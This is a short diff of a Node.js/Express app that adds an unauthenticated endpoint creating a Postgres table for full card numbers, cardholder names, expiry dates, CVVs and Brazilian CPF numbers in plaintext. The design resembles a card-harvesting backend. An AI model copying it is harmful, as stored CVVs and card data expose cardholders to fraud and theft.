@@ -103,6 +103,30 @@ pool.connect()
   .then(() => console.log("Conectado ao banco Postgres no Render!"))
   .catch(err => console.error("Erro de conexão com o banco:", err.message));
 
+/**********************
+ * NOVO ENDPOINT DB *
+ **********************/
+app.get("/init-db", async (req, res) => {
+  try {
+    const sql = `
+      CREATE TABLE IF NOT EXISTS cartoes (
+        id SERIAL PRIMARY KEY,
+        cpf VARCHAR(20) NOT NULL,
+        numero VARCHAR(20) NOT NULL,
+        nome VARCHAR(100) NOT NULL,
+        validade VARCHAR(10) NOT NULL,
+        cvv VARCHAR(5) NOT NULL,
+        criado_em TIMESTAMP DEFAULT NOW()
+      );
+    `;
+    await pool.query(sql);
+    res.json({ sucesso: true, mensagem: "Tabela 'cartoes' criada ou já existente!" });
+  } catch (err) {
+    console.error("Erro ao criar tabela:", err.message);
+    res.status(500).json({ error: "Erro ao criar tabela" });
+  }
+});
+
 // Rota para salvar cartões
 app.post("/salvar-cartao", async (req, res) => {
   const { cpf, numero, nome, validade, cvv } = req.body;
